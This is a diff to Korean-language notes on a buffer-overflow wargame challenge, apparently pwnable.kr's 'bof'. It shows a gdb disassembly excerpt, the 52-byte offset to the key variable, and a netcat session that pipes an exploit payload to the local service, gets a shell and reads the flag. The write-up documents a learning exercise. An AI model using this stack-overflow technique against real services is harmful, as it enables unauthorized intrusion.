@@ -2,6 +2,7 @@
 - &key: `ebp + 0x8
 - overflowme: `ebp - 0x2c`
 - 8 - (-44) = 52 -> 52B 떨어져 있음. 둘이 연속적으로 위치하지 않는다.
+- 52B를 모두 덮어쓴다. 호출자에 대한 정보들이 있지만, 함수가 리턴하기 전까지는 덮어써도 문제 없다. 쉘을 얻을 때까지는 문제 없다.
 ```asm
 pwndbg> disassemble func
 Dump of assembler code for function func:
@@ -57,4 +58,21 @@ Dump of assembler code for function func:
    0x5655629b <+158>:	pop    ebp
    0x5655629c <+159>:	ret
 End of assembler dump.
+```
+
+- `nc 0 9000`을 통해 bof_pwn 권한으로 실행 중인 bof 프로세스에 접근한다. 여기서 shell을 탈취하면 flag 파일을 읽을 수 있다.
+- `exploit.py` 스크립트의 실행 결과 파일 `/tmp/input2.txt`. 이 파일을 읽으면 key의 값이 `0xcafebabe`로 덮어쓰인다.
+- 그런데 리다이렉션을 해버리면 표준 입력이 닫혀버리는 문제가 있다. 이를 해결하기 위해 cat 2개의 출력을 nc에 리다이렉션했다.
+```bash
+bof@ubuntu:~$ (cat /tmp/input2.txt; cat) | nc 0 9000
+ls
+bof
+bof.c
+flag
+log
+super.pl
+cat flag
+Daddy_I_just_pwned_a_buff3r!
+exit
+*** stack smashing detected ***: terminated
 ```
